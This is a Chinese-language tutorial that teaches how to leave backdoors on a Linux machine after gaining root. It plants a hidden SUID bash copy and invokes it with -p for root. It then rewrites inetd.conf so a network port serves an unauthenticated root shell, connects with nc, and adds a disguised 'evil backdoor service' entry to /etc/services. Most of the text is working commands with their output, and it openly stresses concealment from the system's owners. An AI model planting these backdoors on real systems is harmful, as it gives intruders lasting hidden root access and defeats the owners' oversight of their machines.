你现在已经是root用户， 想留一个后门

## suid shell

首先, 先切换成为root用户，并执行以下的命令:
```
dawg:~# cp /bin/bash /.woot
dawg:~# chmod 4755 /.woot
dawg:~# ls -al
 /.woot-rwsr-xr-x 1 root root 690668 Jul 24 17:14 /.woot
```
当然, 你也可以起其他更具备隐藏性的名字,我想猥琐并机智的你，肯定能想出很多好的名字的。文件前面的那一点也不是必要的，只是为了隐藏文件( 在文件名的最前面加上“.”，就可以在任意文件目录下进行隐藏) .

现在，做为一个普通用户，我们来启用这个后门:

```
fw@dawg:~$ iduid=1000(fw) gid=1000(fw) groups=1000(fw)
fw@dawg:~$ /.woot.woot-2.05b$ iduid=1000(fw) gid=1000(fw) groups=1000(fw).woot-2.05b$
```
为什么不行呢?
因为 bash2 针对 suid有一些护卫的措施. 但这也不是不可破的:

```
.woot-2.05b$ /.woot -p
.woot-2.05b# id
uid=1000(fw) gid=1000(fw) euid=0(root) groups=1000(fw)
```
使用-p参数来获取一个root shell. 这个euid的意思是 effective user id(关于这些ID的知识，可以戳这里)
这里要特别注意的是，作为一个普通用户执行这个SUID shell时，一定要使用全路径。
小知识：
如何查找那些具有SUID 的文件:

`dawg:~# find / -perm +4000 -ls`

这时就会返回具有SUID位的文件啦

## 远程后门：利用inetd.conf

我们使用vi来修改 /etc/inetd.conf 文件
原文件：
```
#chargen dgram udp wait root internal
#discard stream tcp nowait root internal
#discard dgram udp wait root internal
#daytime stream tcp nowait root internal
```
修改为:
```
#discard stream tcp nowait root internal
#discard dgram udp wait root internal
daytime stream tcp nowait root /bin/bash bash -i
```
开启inetd：
```
dawg:~# inetd
```
如果要强制重启inetd：
```
dawg:~# ps -ef | grep inetd
root 362 1 0 Jul22 ? 00:00:00 /usr/sbin/inetdroot 13769 13643 0 17:51 pts/1 00:00:00 grep inetd
dawg:~# kill -HUP 362
```

现在我们就可以用nc来爆菊了：
```
C:tools 192.168.1.77: inverse host lookup failed: h_errno 11004: NO_DATA(UNKNOWN) [192.168.1.77] 13 (daytime) openbash: no job control in this shellbash-2.05b
# bash-2.05b
#bash-2.05b
# id
uid=0(root) gid=0(root) groups=0(root)bash-2.05b
# uname -a
Linux dawg 2.4.20-1-386 #3 Sat Mar 22 12:11:40 EST 2003 i686 GNU/Linux
```
小贴士:
我们可以修改`/etc/services`文件，加入以下的东西：
`woot 6666/tcp #evil backdoor service`
然后修改`/etc/inetd.conf` ：
`woot stream tcp nowait root /bin/bash bash -i`
我们可以修改成一些常见的端口，以实现隐藏。

